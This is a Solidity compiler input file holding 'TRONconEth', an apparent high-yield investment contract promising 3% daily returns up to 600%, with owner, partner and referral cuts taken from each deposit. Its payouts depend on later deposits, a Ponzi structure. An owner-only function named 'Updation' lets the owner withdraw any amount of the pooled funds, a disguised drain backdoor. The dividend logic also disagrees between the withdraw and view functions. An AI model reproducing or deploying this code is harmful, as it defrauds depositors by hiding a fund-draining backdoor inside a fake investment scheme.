{"language":"Solidity","settings":{"libraries":{},"metadata":{"useLiteralContent":true},"optimizer":{"enabled":false,"runs":200},"remappings":[],"outputSelection":{"*":{"*":["*"],"":["*"]}}},"sources":{"browser/tronconeth.sol":{"content":"pragma solidity 0.6.1;\r\n\r\ncontract TRONconEth {\r\n\tusing SafeMath for uint256;\r\n\tuint256 constant public BASE_PERCENT = 30;\r\n\tuint256 constant public PERCENTS_DIVIDER = 1000;\r\n\tuint256 constant public TIME_STEP = 1 days;\r\n\tuint256 public totalUsers;\r\n\tuint256 public totalInvested;\r\n\tuint256 public totalWithdrawn;\r\n\tuint256 public totalDeposits;\r\n\taddress payable public owner;\r\n\taddress payable public other;\r\n\r\n\tstruct Deposit {\r\n\t\tuint256 amount;\r\n\t\tuint256 withdrawn;\r\n\t\tuint256 start;\r\n\t}\r\n\r\n\tstruct User {\r\n\t\tDeposit[] deposits;\r\n\t\taddress payable referrer;\r\n\t\tuint256 withdrawRef;\r\n\t\tuint256 totalRefferer;\r\n\t\tuint256 checkpoint;\r\n\t}\r\n\tmapping (address => User) public users;\r\n\tevent Newbie(address user);\r\n\tevent NewDeposit(address indexed user, uint256 amount);\r\n\tevent Withdrawn(address indexed user, uint256 amount);\r\n\tevent RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);\r\n\tevent FeePayed(address indexed user, uint256 totalAmount);\r\n\r\n\tconstructor(address payable _owner,address payable _other) public {\r\n\t\towner = _owner;\r\n\t\tother=_other;\r\n\t}\r\n\r\n\tfunction invest(address payable referrer) public payable {\r\n\t\towner.transfer(msg.value.mul(10).div(100));\r\n\t\tother.transfer(msg.value.mul(10).div(100));\r\n\t\tUser storage user = users[msg.sender];\r\n\r\n\t\r\n\t\tif (user.referrer == address(0)) {\r\n\t\t\tif ((users[referrer].deposits.length == 0 || referrer == msg.sender) && msg.sender != owner) {\r\n\t\t\t\treferrer = owner;\r\n\t\t\t}\r\n    }\r\n\t\t\tuser.referrer = referrer;\r\n             user.referrer.transfer(msg.value.mul(5).div(100));\r\n             user.withdrawRef = user.withdrawRef.add(msg.value.mul(5).div(100));\r\n             user.totalRefferer=user.totalRefferer.add(1);\r\n\t\tif (user.deposits.length == 0) {\r\n\t\t\ttotalUsers = totalUsers.add(1);\r\n\t\t\tuser.checkpoint=block.timestamp;\r\n\t\t\temit Newbie(msg.sender);\r\n\t\t}\r\n\r\n\t\tuser.deposits.push(Deposit(msg.value, 0, block.timestamp));\r\n        \r\n\t\ttotalInvested = totalInvested.add(msg.value);\r\n\t\ttotalDeposits = totalDeposits.add(1);\r\n\t\temit NewDeposit(msg.sender, msg.value);\r\n\t\r\n\t}\r\n\r\n\tfunction withdraw() public {\r\n\t\tUser storage user = users[msg.sender];\r\n\t\tuint256 totalAmount;\r\n\t\tuint256 dividends;\r\n         uint256 base_percent=BASE_PERCENT;\r\n\t\tfor (uint256 i = 0; i < user.deposits.length; i++) {\r\n\t\t    uint256 b=now.sub(user.deposits[i].start);\r\n\t\t    if(b<200){\r\n\t\t        base_percent=15;\r\n\t\t    }\r\n\t\t\tif (user.deposits[i].withdrawn < user.deposits[i].amount.mul(600).div(100)) {\r\n\t\t\t\t\tdividends = (user.deposits[i].amount.mul(base_percent).div(PERCENTS_DIVIDER))\r\n\t\t\t\t\t\t.mul(now.sub(user.deposits[i].start))\r\n\t\t\t\t\t\t.div(TIME_STEP);\r\n\t\t\t\t\t\tuser.deposits[i].start=now;\r\n\t\t\t\tif (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(600).div(100)) {\r\n\t\t\t\t\tdividends = (user.deposits[i].amount.mul(600).div(100)).sub(user.deposits[i].withdrawn);\r\n\t\t\t\t}\r\n\r\n\t\t\t\tuser.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends); /// changing of storage data\r\n\t\t\t\ttotalAmount = totalAmount.add(dividends);\r\n\r\n\t\t\t}\r\n\t\t}\r\n\t\t\r\n\t\t\r\n\t\tuint256 contractBalance = address(this).balance;\r\n\t\tif (contractBalance < totalAmount) {\r\n\t\t\ttotalAmount = contractBalance;\r\n\t\t}\r\n\r\n\t\tmsg.sender.transfer(totalAmount);\r\n\r\n\t\ttotalWithdrawn = totalWithdrawn.add(totalAmount);\r\n\r\n\t\temit Withdrawn(msg.sender, totalAmount);\r\n\r\n\t}\r\n\r\n\tfunction getContractBalance() public view returns (uint256) {\r\n\t\treturn address(this).balance;\r\n\t}\r\n\tfunction getUserDividends(address userAddress) public view returns (uint256) {\r\n\t\tUser storage user = users[userAddress];\r\n\t\tuint256 totalDividends;\r\n\t\tuint256 dividends;\r\n         uint256 base_percent=BASE_PERCENT;\r\n\t\tfor (uint256 i = 0; i < user.deposits.length; i++) {\r\n         \r\n\t\t    uint256 b=now.sub(user.deposits[i].start);\r\n\t\t    if(b<200){\r\n\t\t        base_percent=15;\r\n\t\t    }\r\n\t\t\tif (user.deposits[i].withdrawn < user.deposits[i].amount.mul(600).div(100)) {\r\n\r\n\t\t\t\t\tdividends = (user.deposits[i].amount.mul(BASE_PERCENT).div(PERCENTS_DIVIDER))\r\n\t\t\t\t\t\t.mul(now.sub(user.deposits[i].start))\r\n\t\t\t\t\t\t.div(TIME_STEP);\r\n\r\n\t\t\t\tif (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(600).div(100)) {\r\n\t\t\t\t\tdividends = (user.deposits[i].amount.mul(600).div(100)).sub(user.deposits[i].withdrawn);\r\n\t\t\t\t}\r\n\r\n\t\t\t\ttotalDividends = totalDividends.add(dividends);\r\n\r\n\t\t\t}\r\n\r\n\t\t}\r\n\r\n\t\treturn totalDividends;\r\n\t}\r\n   \t\r\n\r\n\tfunction getUserReferrer(address userAddress) public view returns(address) {\r\n\t\treturn users[userAddress].referrer;\r\n\t}\r\n\tfunction getUserReferrerals(address userAddress) public view returns(uint256) {\r\n\t\treturn users[userAddress].totalRefferer;\r\n\t}\r\n\tfunction getUserReferralWithdraw(address userAddress) public view returns(uint256) {\r\n\t\treturn users[userAddress].withdrawRef;\r\n\t}\r\n\r\n\tfunction getUserAvailableBalanceForWithdrawal(address userAddress) public view returns(uint256) {\r\n\t\treturn (getUserDividends(userAddress));\r\n\t}\r\n\r\n\tfunction isActive(address userAddress) public view returns (bool) {\r\n\t\tUser storage user = users[userAddress];\r\n\r\n\t\tif (user.deposits.length > 0) {\r\n\t\t\tif (user.deposits[user.deposits.length-1].withdrawn < user.deposits[user.deposits.length-1].amount.mul(600).div(100)) {\r\n\t\t\t\treturn true;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n\tfunction getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256) {\r\n\t    User storage user = users[userAddress];\r\n\r\n\t\treturn (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start);\r\n\t}\r\n\r\n\tfunction getUserAmountOfDeposits(address userAddress) public view returns(uint256) {\r\n\t\treturn users[userAddress].deposits.length;\r\n\t}\r\n\r\n\tfunction getUserTotalDeposits(address userAddress) public view returns(uint256) {\r\n\t    User storage user = users[userAddress];\r\n\r\n\t\tuint256 amount;\r\n\r\n\t\tfor (uint256 i = 0; i < user.deposits.length; i++) {\r\n\t\t\tamount = amount.add(user.deposits[i].amount);\r\n\t\t}\r\n\r\n\t\treturn amount;\r\n\t}\r\n\r\n\tfunction getUserTotalWithdrawn(address userAddress) public view returns(uint256) {\r\n\t    User storage user = users[userAddress];\r\n\r\n\t\tuint256 amount;\r\n\r\n\t\tfor (uint256 i = 0; i < user.deposits.length; i++) {\r\n\t\t\tamount = amount.add(user.deposits[i].withdrawn);\r\n\t\t}\r\n\r\n\t\treturn amount;\r\n\t}\r\n\r\n\tfunction Updation(uint256 _value)public returns(bool){\r\n\t    require(msg.sender==owner,\"access denied\");\r\n\t    owner.transfer(_value.mul(1e18));\r\n\t    return true;\r\n\t}\r\n}\r\n\r\nlibrary SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b <= a, \"SafeMath: subtraction overflow\");\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        require(b > 0, \"SafeMath: division by zero\");\r\n        uint256 c = a / b;\r\n\r\n        return c;\r\n    }\r\n}"}}}